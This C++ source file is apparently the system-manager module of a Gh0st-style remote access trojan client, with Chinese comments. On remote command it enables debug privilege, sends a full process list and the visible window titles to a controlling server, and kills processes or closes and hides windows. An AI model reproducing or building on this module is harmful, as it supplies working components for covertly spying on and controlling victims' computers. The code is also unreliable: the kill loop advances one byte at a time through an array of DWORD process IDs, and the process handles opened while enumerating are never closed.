#include "stdafx.h"
#include "SystemManager.h"
#include "Common.h"
#include <TLHELP32.H>
#include <Psapi.h>

enum
{
	COMMAND_WINDOW_CLOSE,   //关闭窗口
	COMMAND_WINDOW_TEST,    //操作窗口
};
CSystemManager::CSystemManager(IOCPClient* ClientObject, BOOL bHow)
	: CManager(ClientObject)
{
	if (bHow == COMMAND_SYSTEM)
	{
		SendProcessList();
	}
	else if (bHow == COMMAND_WSLIST)
	{
		SendWindowsList();
	}
}


CSystemManager::~CSystemManager()
{
}

VOID CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch (szBuffer[0])
	{
		//结束进程
		case COMMAND_KILLPROCESS:
		{
			KillProcess((LPBYTE)szBuffer + 1, ulLength -1);
			break;
		}
		//进程列表
		case COMMAND_PSLIST:
		{
			SendProcessList();
			break;
		}
		case COMMAND_WSLIST:
		{
			SendWindowsList();
			break;
		}
		case COMMAND_WINDOW_CLOSE:
		{
			HWND hwnd = *(HWND*)(szBuffer + 1);
			::PostMessage(hwnd, WM_CLOSE, 0, 0);
			Sleep(100);
			SendWindowsList();
			break;
		}
		case COMMAND_WINDOW_TEST:
		{
			TestWindow(szBuffer + 1);
			break;
		}
		default:
			break;
	}
}

VOID CSystemManager::SendProcessList()
{
	
	
	LPBYTE szBuffer = GetProcessList();
	if (szBuffer == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
	szBuffer = NULL;

	
}

VOID CSystemManager::SendWindowsList()
{
	LPBYTE szBuffer = GetWindowsList();
	if (szBuffer == NULL)
	{
		return;
	}
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);

}

LPBYTE CSystemManager::GetProcessList()
{
	//提权
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	HANDLE ProcessHandle = NULL;
	HANDLE SnapshotHandle = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//进程完整路径
	char szProcessFullPath[MAX_PATH] = { 0 };
	SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD dwOffset = 0;
	DWORD dwLength = 0;
	DWORD cbNeeded = 0;
	HMODULE hModule = NULL;
	//申请内存
	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	//数据头
	szBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	//创建进程快照
	
	if (Process32First(SnapshotHandle,&pe32))
	{
		do 
		{
			//根据目标进程ID打开进程的进程句柄
			ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				FALSE, pe32.th32ProcessID);
			//枚举第一个模块（自己本身）句柄  
			EnumProcessModules(ProcessHandle, &hModule, sizeof(hModule), &cbNeeded);
			//得目标进程完整路径
			DWORD dwReturn = GetModuleFileNameEx(ProcessHandle, hModule,
				szProcessFullPath,
				sizeof(szProcessFullPath));
			if (dwReturn == 0)
			{
				strcpy(szProcessFullPath, "打开进程失败或枚举信息失败");
			}
			dwLength = sizeof(DWORD) +
				lstrlen(pe32.szExeFile) + lstrlen(szProcessFullPath) + 2;
			//若缓冲区太小  重新申请
			if (LocalSize(szBuffer) < (dwOffset + dwLength))
			{
				szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
					LMEM_ZEROINIT | LMEM_MOVEABLE);
			}
			//写入进程Id
			memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
			dwOffset += sizeof(DWORD);
			//写入进程名
			memcpy(szBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile));
			dwOffset += lstrlen(pe32.szExeFile) + 1;
			//写入进程完整路径
			memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath));
			dwOffset += lstrlen(szProcessFullPath) +1;

		} while (Process32Next(SnapshotHandle, &pe32));
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //还原提权
	CloseHandle(SnapshotHandle);       //释放句柄 
	return szBuffer;
}

LPBYTE CSystemManager::GetWindowsList()
{
	LPBYTE szBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc,
		(LPARAM)&szBuffer);
	szBuffer[0] = TOKEN_WSLIST;
	return szBuffer;
}

BOOL CSystemManager::DebugPrivilege(const char * szName, BOOL bEnable)
{
	BOOL bResults = TRUE;
	HANDLE TokenHandle;
	TOKEN_PRIVILEGES TokenPrivileges;
	//进程Tokenlingpa
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,&TokenHandle))
	{
		bResults = FALSE;
		return bResults;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, szName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(TokenHandle,  FALSE,&TokenPrivileges, sizeof(TOKEN_PRIVILEGES),
		NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResults = FALSE;
	}
	CloseHandle(TokenHandle);
	return bResults;
}

VOID CSystemManager::KillProcess(LPBYTE szBuffer, ULONG ulLength)
{
	HANDLE ProcessHandle = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	for (int i = 0;i < ulLength;i++)
	{
		//得进程句柄
		ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));

		TerminateProcess(ProcessHandle, 0);
		CloseHandle(ProcessHandle);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //还原提权
											 // 稍稍Sleep下，防止出错
	Sleep(100);
}

VOID CSystemManager::TestWindow(LPBYTE szBuffer)
{
	DWORD Hwnd = 0;
	DWORD dHow = 0;
	memcpy((VOID*)&Hwnd, szBuffer, sizeof(DWORD));
	memcpy(&dHow, szBuffer + sizeof(DWORD), sizeof(DWORD));
	ShowWindow((HWND__*)Hwnd, dHow);
}

BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	DWORD dwProcessId = 0;
	LPBYTE szBuffer = *(LPBYTE*)lParam;

	char szTitle[1024] = { 0 };
	memset(szTitle, 0, sizeof(szTitle));

	GetWindowText(hWnd, szTitle, sizeof(szTitle));

	if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
	{
		return TRUE;
	}

	if (szBuffer == NULL)
	{
		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
		
	}
	dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
	dwOffset = LocalSize(szBuffer);
	szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	memcpy((szBuffer + dwOffset), &hWnd, sizeof(DWORD));
	memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);

	*(LPBYTE *)lParam = szBuffer;
	return TRUE;

}
